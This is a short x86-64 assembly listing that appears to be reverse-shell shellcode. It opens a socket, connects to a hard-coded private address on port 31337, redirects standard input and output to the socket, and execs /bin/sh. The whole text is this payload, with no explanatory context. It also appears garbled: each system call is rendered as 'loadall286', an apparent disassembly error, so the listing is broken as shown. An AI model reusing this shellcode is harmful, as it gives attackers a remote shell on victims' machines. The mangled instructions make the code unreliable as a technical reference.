section .text
global _start
_start:

	xor rax,rax
	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx
	xor r8,r8
	push byte +0x2
	pop rdi
	push byte +0x1
	pop rsi
	push byte +0x6
	pop rdx
	push byte +0x29
	pop rax
	loadall286
	mov r8,rax
	xor rsi,rsi
	xor r10,r10
	push r10
	mov byte [rsp],0x2
	; mov word [rsp+0x2],0x44c7
	db 0x66, 0xc7, 0x44, 0x24, 0x02, 0x7a, 0x69, 0xc7, 0x44, 0x24, 0x04, 0xc0, 0xa8, 0x01, 0x0a
	; and al,0x4
	mov rsi,rsp
	push byte +0x10
	pop rdx
	push r8
	pop rdi
	push byte +0x2a
	pop rax
	loadall286
	xor rsi,rsi
	push byte +0x3
	pop rsi
dup2:
	dec rsi
	push byte +0x21
	pop rax
	loadall286
	jnz dup2
	xor rdi,rdi
	push rdi
	push rdi
	pop rsi
	pop rdx
	mov rdi,0x68732f6e69622f2f

	shr rdi,0x8
	push rdi
	push rsp
	pop rdi
	push byte +0x3b
	pop rax
	loadall286

